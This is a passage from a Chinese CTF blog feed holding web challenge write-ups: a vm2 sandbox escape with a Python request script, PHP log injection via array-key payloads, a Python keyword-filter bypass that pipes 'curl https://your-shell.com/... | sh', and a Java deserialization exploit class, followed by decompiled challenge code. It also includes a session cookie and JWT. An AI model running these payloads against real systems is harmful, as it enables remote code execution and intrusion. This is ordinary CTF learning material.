alt="image-20230523202607587"></p><p>这里因为给了这个vm2的版本，于是就去google搜索，于是第一个就是</p><p><a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244</a></p><p>这里当时卡住的原因是因为</p><p><img src="../images/image-20230523203752773.png" alt="image-20230523203752773"></p><p>所以当时就很疑惑，不知道怎么绕过他</p><p>然后看到别人给的wp</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">&quot;name&quot;</span>: <span class="number">123</span>,<span class="string">&quot;properties&quot;</span>:&#123;<span class="string">&quot;length&quot;</span>: <span class="number">1</span>,<span class="string">&quot;0&quot;</span>:&#123;<span class="string">&quot;0&quot;</span>: <span class="string">&quot;vm2_tester&quot;</span>,<span class="string">&quot;length&quot;</span>:<span class="number">1</span>&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230523203841137.png" alt="image-20230523203841137"></p><p>gpt给出的解释</p><p>这里能这样写来绕过是因为</p><p><img src="../images/image-20230523204429937.png" alt="image-20230523204429937"></p><p>这三个地方的缘故</p><p>其实就是跟上面的这个<code>copyArray</code>函数有很大的关系</p><p><code>&#123;&quot;name&quot;: 123,&quot;properties&quot;:&#123;&quot;length&quot;: 1,&quot;0&quot;:&#123;&quot;0&quot;: &quot;vm2_tester&quot;,&quot;length&quot;:1&#125;&#125;&#125;</code></p><p>就是<code>properties</code>这个key值的长度是1，然后又因为arr1[0]是一个对象，然后满足第一个判断，然后到最后返回的<code>arr2</code>就是<code>&#123;&quot;0&quot;:&#123;&quot;0&quot;: &quot;vm2_tester&quot;,&quot;length&quot;:1&#125;&#125;</code>这个玩意了</p><p>然后<code>req.session.user.properties[i]</code>就等于<code>&#123;&quot;0&quot;:&#123;&quot;0&quot;: &quot;vm2_tester&quot;,&quot;length&quot;:1&#125;&#125;</code></p><p><img src="../images/image-20230523205118270.png" alt="image-20230523205118270"></p><p>这样的话就可以同时解决上面提出的矛盾了   主要还是归功于上面的那个<code>copyArray</code>函数了</p><p><strong>最后的code代码执行就是前面搜的那篇文章里的内容了</strong></p><p><a href="https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244">https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244</a></p><p><img src="../images/image-20230523205306489.png" alt="image-20230523205306489"></p><p>然后这里得需要python发包，bp和hackbar不行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://116.236.144.37:26806/vm2&#x27;</span></span><br><span class="line">data = &#123;<span class="string">&quot;code&quot;</span>:<span class="string">&quot;eval(\&quot;const stack=()=&gt;&#123;new Error().stack;stack();&#125;;err = &#123;&#125;;const handler = &#123;getPr\&quot;+\&quot;ototypeOf(target) &#123;(stack)();&#125;&#125;;const proxiedErr = new Proxy(err, handler);try &#123;throw proxiedErr;&#125; catch (&#123;constructor: c&#125;) &#123;c.constructor(&#x27;return process&#x27;)().mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;cat /f*&#x27;);&#125;\&quot;)&quot;</span>&#125;</span><br><span class="line">headers = &#123;</span><br><span class="line">    <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Cookie&quot;</span>: <span class="string">&quot;rt_web_csrf_token=kOIwOsYocCJkXVKSQmTFWuvDWpVuizhu013Lxk78cg54iyChQBApFDCItboLOJeW; rt_web__jwt_token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VyX2lkIjoiZDRkMzhkNTVmYTdlZTIxYTgzODQ2MTUyNjg3NWYyMDMiLCJ1c2VybmFtZSI6IjE1Nzk5MDYwODUyIiwiZXhwIjoxNjg0OTMwNTY5LCJlbWFpbCI6IjE0Nzg0NTYzMDlAcXEuY29tIn0.M_dtAsuFk53-OccuslbUMB8s1BgQTF4LnBNp6gYecJ4; connect.sid=s%3AMrWVq2g4AyaXTVVHfmYR-lk66QfcMNuC.2bEPGUZvaMBVCw7UlneXFQjT4t9oTEzCW6x4HkCtHkI·&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url, json=data, headers=headers)</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p><img src="../images/image-20230523205848825.png" alt="image-20230523205848825"></p><p>这里记得把cookie给换上自己的</p><h2 id="easy-log"><a href="#easy-log" class="headerlink" title="easy_log"></a>easy_log</h2><p>题目是长这样的</p><p><img src="../images/image-20230523210140219.png" alt="image-20230523210140219"></p><p><img src="../images/image-20230523210119944.png" alt="image-20230523210119944"></p><p>就是通过自己输入的值，来到这个php文件里执行代码，当然也过滤了很多东西</p><p><img src="../images/image-20230523210328183.png" alt="image-20230523210328183"></p><p>php文件里就是这些内容 </p><p>这里的话因为username被过滤太多东西了，<strong>php标记</strong>全给过滤掉了</p><p>于是我们就去看看ip或者uri能不能传值</p><p><img src="../images/image-20230523210917110.png" alt="image-20230523210917110"></p><p><img src="../images/image-20230523210923513.png" alt="image-20230523210923513"></p><p>写是写进去了，但是并没有执行</p><p>然后查看源码发现</p><p><img src="../images/image-20230523210956502.png" alt="image-20230523210956502"></p><p>这里的把<code>&lt;</code>给换掉了，那么我们就得另寻出路了</p><p>真正的解法就是传数组，这里的话waf只对参数的值的有用，对参数名是没有用的，</p><p><code>username[xxx]=123</code></p><p>就是后端只会检测123，并不会检测xxx</p><p>所以我们就可以利用这个方法来传参</p><p>直接用超级编码法</p><p><code>password=asd&amp;username[&lt;?php%20eval(base64_decode(c3lzdGVtKCJscyAvIik7));?&gt;]=123</code></p><p>这是编码内容是<code>system(&#39;ls /&#39;);</code></p><p>然后读出文件名</p><p><code>password=asd&amp;username[&lt;?php%20eval(base64_decode(c3lzdGVtKCdjYXQgL1MzcmVjdF8xU19IM3JlJyk7));?&gt;]=123</code></p><p><img src="../images/image-20230523211833958.png" alt="image-20230523211833958"></p><p>然后就读到了flag</p><h2 id="ezpython"><a href="#ezpython" class="headerlink" title="ezpython"></a>ezpython</h2><p>题目</p><p><img src="../images/image-20230523212029359.png" alt="image-20230523212029359"></p><p>就是绕过关键字的过滤</p><p>这里的话我使用迷你下标进行绕过的(在之前的d3学到的这个)</p><p>payload</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ₑval(__impₒrt__(<span class="string">&#x27;o&#x27;</span>+<span class="string">&#x27;s&#x27;</span>).pₒpen(<span class="string">&#x27;curl https://your-shell.com/xxxx:666 |sh&#x27;</span>).read())</span><br></pre></td></tr></table></figure><h2 id="fun-java"><a href="#fun-java" class="headerlink" title="fun_java"></a>fun_java</h2><p><img src="../images/image-20230523212639053.png" alt="image-20230523212639053"></p><p><strong>Jckson调getter，然后TemplatesImpl命令执行，和阿里云bypass_1差不多，但我没做出来</strong></p><p><strong>这是个文章开头给的链接的那个师傅写的</strong>(这里话先去看看<strong>bypass_1</strong>)</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://fushuling.com/index.php/2023/05/21/%e7%ac%ac%e5%85%ab%e5%b1%8a%e4%b8%8a%e6%b5%b7%e5%b8%82%e5%a4%a7%e5%ad%a6%e7%94%9f%e7%</summary>
      
    
    
    
    
    <category term="上海磐石行动-web-2023" scheme="https://ke1nys.github.io/tags/%E4%B8%8A%E6%B5%B7%E7%A3%90%E7%9F%B3%E8%A1%8C%E5%8A%A8-web-2023/"/>
    
  </entry>
  
  <entry>
    <title>java-反序列化题目</title>
    <link href="https://ke1nys.github.io/posts/450c467.html"/>
    <id>https://ke1nys.github.io/posts/450c467.html</id>
    <published>2023-05-22T06:43:58.000Z</published>
    <updated>2023-05-31T14:02:50.838Z</updated>
    
    <content type="html"><![CDATA[<p>这里的话是记录一下关于java反序列化的刷题</p><p><strong>(因为刚把一些链子给跟完)</strong></p><h2 id="东华杯ezgadget"><a href="#东华杯ezgadget" class="headerlink" title="东华杯ezgadget"></a>东华杯ezgadget</h2><p>原题的jar包 可以把代码拷出来自己跑下<br>链接：<a href="https://pan.baidu.com/s/1t5-fV7SUETDEI5-qbZZQrw">https://pan.baidu.com/s/1t5-fV7SUETDEI5-qbZZQrw</a><br>提取码：8do5</p><p><code>java -jar ezgadget.jar</code>在kali或者自己的服务器上运行跑一下，搭建一个环境</p><p>拿到jar包后先放到<strong>jd-gui</strong>里面进行反编译一下</p><p>然后在导到idea进行测试(<strong>这里的话是得根据题目自己创建package来导入</strong>)</p><p><img src="../images/image-20230522161955641.png" alt="image-20230522161955641"></p><p>导入到idea里后，进行代码审计</p><p>先是查看<code>pom.xml</code>看有无一些常见链子的依赖</p><p><img src="../images/image-20230522162058331.png" alt="image-20230522162058331"></p><p>这里的话是没有</p><p><strong>Tools.java</strong></p><p><img src="../images/image-20230522162207881.png" alt="image-20230522162207881"></p><p>这里提供了他一些函数是进行base64编码和解码的，还有序列化和反序列化的</p><p><strong>IndexController.java</strong></p><p><img src="../images/image-20230522163815734.png" alt="image-20230522163815734"></p><p><strong>TostringBean.java</strong></p><p><img src="../images/image-20230522162343938.png" alt="image-20230522162343938"></p><p>这里话是提供了一个动态类加载的<code>defineClass</code>方法     并且还会实例化</p><p>这里话就说明了这道题是不出网的，得在自己本地执行编译过的恶意代码</p><p>那么我们就得找一下谁调用了这个<code>TostringBean.toString()</code>方法</p><p>这里如果对cc链比较熟悉的话，一下就能猜出来了</p><p><img src="../images/image-20230522163614748.png" alt="image-20230522163614748"></p><p>cc5这条链子就有一个类的<code>readObject</code>方法是调用这个<code>toSting</code>方法的</p><p>于是调用链就是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">BadAttributeValueExpException.readobject  --&gt; ToStringBean.toString</span><br></pre></td></tr></table></figure><p>于是我们就开始写exp</p><p>这里的话先从执行代码那部分开始写</p><p><img src="../images/image-20230522164138690.png" alt="image-20230522164138690"></p><p>这里话是得使用反射调用来给这个参数赋值</p><p><strong>这里附的值就是我们本地的编译过的恶意代码</strong></p><p><img src="../images/image-20230522164815484.png" alt="image-20230522164815484"></p><p><img src="../images/image-20230522165301451.png" alt="image-20230522165301451"></p><p>然后就把执行代码的这部分写完了</p><p>接下来就是写使用<code>BadAttributeValueExpException.readobject</code>来触发<code>toString</code>这个函数了</p><p>先跟进去看一下这个类</p><p><strong>先看他的构造函数</strong></p><p><img src="../images/image-20230522165750768.png" alt="image-20230522165750768"></p><p>在实例化的时候会执行这个方法，赋值就会执行toString方法，但是这里我们不能直接传Tostingbean方法，因为如果这里进行了调用了话，readobject方法的时候在调用会报错</p><p>所以这里的我们在实例化的时候就随便传一个值。</p><p><strong>在看一下他的readobject方法</strong></p><p><img src="../images/image-20230522165951342.png" alt="image-20230522165951342"></p><p>就是会获取val这个参数的值并赋给valObj这个参数，然后在最后的时候就会调用valObj.toString()方法</p><p>所以关键点就在这个val参数这里，这里的话我们就可以考虑使用反射调用来进行修改这里的值</p><p><img src="../images/image-20230522170424460.png" alt="image-20230522170424460"></p><p>这样就写好了</p><p>然后因为在这个/readobject路由里还得满足一些要求才能进行反序列化</p><p><img src="../images/image-20230522170453923.png" alt="image-20230522170453923"></p><p><img src="../images/image-20230522170752259.png" alt="image-20230522170752259"></p><p>这样就全部写完了</p><p>但是这里得需要先进行解码，所以我们还得对字节流进行编码</p><p><img src="../images/image-20230522170835166.png" alt="image-20230522170835166"></p><p><img src="../images/image-20230522171128098.png" alt="image-20230522171128098"></p><p>进行了编码</p><p>然后输出</p><p><img src="../images/image-20230522172417365.png" alt="image-20230522172417365"></p><p>然后将编码后的结果进行<strong>url编码</strong>，然后data传参就行了(<strong>必须得进行url编码 </strong>)</p><p>就可以成功反弹shell了</p><p><strong>EXP.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ezgame.ctf;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.ezgame.ctf.tools.ToStringBean;</span><br><span class="line"><span class="keyword">import</span> com.ezgame.ctf.tools.Tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EXP</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ToStringBean</span> <span class="variable">toStringBean</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ToStringBean</span>();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> toStringBean.getClass().getDeclaredField(<span class="string">&quot;ClassByte&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">byte</span>[] bytes = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\ctf application\\idea\\IntelliJ IDEA Community Edition 2022.3.1\\project\\ezgadget\\target\\classes\\com\\ezgame\\ctf\\payload.class&quot;</span>));</span><br><span class="line">        field.set(toStringBean,bytes);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">badAttributeValueExpException</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="number">123123123</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">filed</span> <span class="operator">=</span> badAttributeValueExpException.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        filed.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        filed.set(badAttributeValueExpException,toStringBean);</span><br><span class="line"></span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeUTF(<span class="string">&quot;gadgets&quot;</span>);</span><br><span class="line">        objectOutputStream.writeInt(<span class="number">2021</span>);</span><br><span class="line">        objectOutputStream.writeObject(badAttributeValueExpException);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes1 = byteArrayOutputStream.toByteArray();</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> Tools.base64Encode(bytes1);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>妈的  吐槽一下  这里的话得需要jdk1.8来运行jar包   如果用jdk17的话   会shell弹不上去</strong>(这里卡了好久，晕了)</p><h2 id="网鼎杯-2020-朱雀组-Think-Java"><a href="#网鼎杯-2020-朱雀组-Think-Java" class="headerlink" title="[网鼎杯 2020 朱雀组]Think Java"></a>[网鼎杯 2020 朱雀组]Think Java</h2><p>考点</p><p><a href="https://tttang.com/archive/1877/#toc_mysql-jdbc">MYSQL JDBC反序列化解析</a>  </p><p>(<strong>上面的文章是讲造成这个jdbc反序列化的原因，并且跟着链一步一步分析</strong>)</p><p>(<strong>下面的文章是讲使用mysql恶意服务来配合着jdbc反序列化漏洞来使用</strong>)</p><p><a href="https://www.mi1k7ea.com/2021/04/23/MySQL-JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/#JDBC%E7%AE%80%E4%BB%8B">MYSql恶意服务+ JDBC的使用 </a></p><p><a href="https://blog.csdn.net/RABCDXB/article/details/124003575">参考文章</a></p><p><strong>jdbc反序列化 (jdbc sql注入)  rome链</strong></p><p>先下载jar包，然后丢进jd-gui里进行分析</p><p><img src="../images/image-20230525105104895.png" alt="image-20230525105104895"></p><p>这里的话就只给了部分代码</p><p><strong>Row.java</strong></p><p>就是自己写了有个Row类</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sqldict;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Row</span> &#123;</span><br><span class="line">  String name;</span><br><span class="line">  </span><br><span class="line">  String type;</span><br><span class="line">  </span><br><span class="line">  String def;</span><br><span class="line">  </span><br><span class="line">  String isNull;</span><br><span class="line">  </span><br><span class="line">  String isAuto;</span><br><span class="line">  </span><br><span class="line">  String remark;</span><br><span class="line">  </span><br><span class="line">  String isPK;</span><br><span class="line">  </span><br><span class="line">  String size;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getIsPK</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.isPK;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setIsPK</span><span class="params">(String isPK)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.isPK = isPK;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getType</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.type;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setType</span><span class="params">(String type)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.type = type;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getDef</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.def;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setDef</span><span class="params">(String def)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.def = def;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getIsNull</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.isNull;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setIsNull</span><span class="params">(String isNull)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.isNull = isNull;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getIsAuto</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.isAuto;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setIsAuto</span><span class="params">(String isAuto)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.isAuto = isAuto;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getRemark</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.remark;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setRemark</span><span class="params">(String remark)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.remark = remark;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> String <span class="title function_">getSize</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.size;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSize</span><span class="params">(String size)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.size = size;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Row</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="title function_">Row</span><span class="params">(String name, String type, String def, String isNull, String isAuto, String remark, String isPK, String size)</span> &#123;</span><br><span class="line">    <span class="built_in">this</span>.name = name;</span><br><span class="line">    <span class="built_in">this</span>.type = type;</span><br><span class="line">    <span class="built_in">this</span>.def = def;</span><br><span class="line">    <span class="built_in">this</span>.isNull = isNull;</span><br><span class="line">    <span class="built_in">this</span>.isAuto = isAuto;</span><br><span class="line">    <span class="built_in">this</span>.remark = remark;</span><br><span class="line">    <span class="built_in">this</span>.isPK = isPK;</span><br><span class="line">    <span class="built_in">this</span>.size = size;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>SqlDict.java</strong></p><p>连接数据库，其中sql语句处存在sql注入漏洞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> sqldict;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> cn.abc.core.sqldict.Row;</span><br><span class="line"><span class="keyword">import</span> cn.abc.core.sqldict.Table;</span><br><span class="line"><span class="keyword">import</span> java.sql.Connection;</span><br><span class="line"><span class="keyword">import</span> java.sql.DatabaseMetaData;</span><br><span class="line"><span class="keyword">import</span> java.sql.DriverManager;</span><br><span class="line"><span class="keyword">import</span> java.sql.ResultSet;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.Statement;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SqlDict</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> Connection <span class="title function_">getConnection</span><span class="params">(String dbName, String user, String pass)</span> &#123;</span><br><span class="line">    <span class="type">Connection</span> <span class="variable">conn</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">      Class.forName(<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span> (dbName != <span class="literal">null</span> &amp;&amp; !dbName.equals(<span class="string">&quot;&quot;</span>)) &#123;</span><br><span class="line">        dbName = <span class="string">&quot;jdbc:mysql://mysqldbserver:3306/&quot;</span> + dbName;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        dbName = <span class="string">&quot;jdbc:mysql://mysqldbserver:3306/myapp&quot;</span>;</span><br><span class="line">      &#125; </span><br><span class="line">      <span class="keyword">if</span> (user == <span class="literal">null</span> || dbName.equals(<span class="string">&quot;&quot;</span>))</span><br><span class="line">        user = <span class="string">&quot;root&quot;</span>; </span><br><span class="line">      <span class="keyword">if</span> (pass == <span class="literal">null</span> || dbName.equals(<span class="string">&quot;&quot;</span>))</span><br><span class="line">        pass = <span class="string">&quot;abc@12345&quot;</span>; </span><br><span class="line">      conn = DriverManager.getConnection(dbName, user, pass);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (ClassNotFoundException var5) &#123;</span><br><span class="line">      var5.printStackTrace();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SQLException var6) &#123;</span><br><span class="line">      var6.printStackTrace();</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> conn;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">public</span> <span class="keyword">static</span> List&lt;Table&gt; <span class="title function_">getTableData</span><span class="params">(String dbName, String user, String pass)</span> &#123;</span><br><span class="line">    List&lt;Table&gt; Tables = <span class="keyword">new</span> <span class="title 